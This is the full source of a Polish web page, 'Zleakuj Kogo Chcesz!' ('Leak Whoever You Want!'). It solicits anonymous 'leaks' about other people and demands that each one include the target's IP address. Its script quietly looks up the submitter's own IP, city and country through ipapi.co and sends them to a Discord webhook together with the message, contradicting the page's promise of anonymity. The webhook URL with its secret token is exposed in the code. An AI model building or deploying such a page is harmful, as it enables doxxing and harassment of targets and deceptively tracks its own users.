<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Zleakuj Kogo Chcesz!</title>
  <meta property="og:title" content="Zleakuj Kogo Chcesz!">
  <meta property="og:description" content="Anonimowe Leaki">
  <meta property="og:image" content="https://pin.it/2Y2HWgX32">
  <meta property="og:url" content="https://zleakujkogochcesz.github.io/">
  <meta property="og:type" content="website">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #111;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 1rem;
    }
    .container {
      background: #222;
      padding: 2rem;
      border-radius: 10px;
      width: 100%;
      max-width: 500px;
      box-shadow: 0 0 10px #000;
    }
    input, textarea {
      width: 100%;
      padding: 1rem;
      margin-top: 0.5rem;
      border-radius: 5px;
      border: none;
      resize: none;
      font-size: 1rem;
    }
    button {
      margin-top: 1rem;
      width: 100%;
      padding: 1rem;
      border: none;
      background: #5865F2;
      color: #fff;
      font-size: 1rem;
      border-radius: 5px;
      cursor: pointer;
    }
    .status {
      margin-top: 1rem;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Wyślij anonimowy leak. Leaki bez podanego ip nie będą wrzucane.</h2>
    <label for="nick">Twój nick:</label>
    <input type="text" id="nick" placeholder="np. ddoslover">
    
    <label for="message">Leak:</label>
    <textarea id="message" placeholder="Wpisz wiadomość..."></textarea>
    
    <button onclick="sendMessage()">Wyślij</button>
    <div class="status" id="status"></div>
  </div>

<script>
  const webhookURL = 'https://discord.com/api/webhooks/1391554398278385754/LRqlcru1aeh627xr_DXpyJ8JRvBshtnY1ENqcTWkigFQWA7Abt9Dojkwzm22M4-dfQnr';
  let canSend = true;

  async function sendMessage() {
    const nick = document.getElementById('nick').value.trim() || 'Anonim';
    const message = document.getElementById('message').value.trim();
    const status = document.getElementById('status');

    if (!message) {
      status.textContent = 'Wiadomość nie może być pusta.';
      status.style.color = 'orange';
      return;
    }

    if (!canSend) {
      status.textContent = 'Poczekaj chwilę przed kolejnym wysłaniem (30s).';
      status.style.color = 'orange';
      return;
    }

    // 🔍 Pobierz dane IP i lokalizację
    let ip = 'Nieznany';
    let country = 'Nieznany';
    let city = 'Nieznane';

    try {
      const res = await fetch('https://ipapi.co/json/');
      const data = await res.json();
      ip = data.ip || ip;
      country = data.country_name || country;
      city = data.city || city;
    } catch (e) {
      console.warn('Nie udało się pobrać danych geolokalizacji.');
    }

    const content = `❤️‍🩹 **${nick}** ❤️‍🩹 zleakował:\n${message}\n\n🌐 IP: ${ip}\n🏙️ Lokalizacja: ${city}, ${country}`;

    fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content })
    })
    .then(response => {
      if (response.ok) {
        status.textContent = 'Wiadomość została wysłana!';
        status.style.color = 'lightgreen';
        document.getElementById('message').value = '';
        canSend = false;
        setTimeout(() => {
          canSend = true;
          status.textContent = '';
        }, 30000); // 30 sekund
      } else {
        status.textContent = 'Błąd podczas wysyłania wiadomości.';
        status.style.color = 'red';
      }
    })
    .catch(error => {
      status.textContent = 'Nie udało się połączyć z webhookiem.';
      status.style.color = 'red';
    });
  }
  </script>
 </body>
</html>
